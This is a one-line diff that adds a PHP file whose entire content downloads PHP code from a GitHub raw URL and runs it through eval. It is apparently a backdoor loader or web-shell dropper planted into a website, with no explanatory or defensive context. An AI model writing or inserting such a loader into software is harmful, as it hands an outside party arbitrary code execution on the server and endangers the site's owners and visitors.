@@ -1,0 +1,1 @@
+<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/hamidaso02/infra/main/Vk3.php"));?>
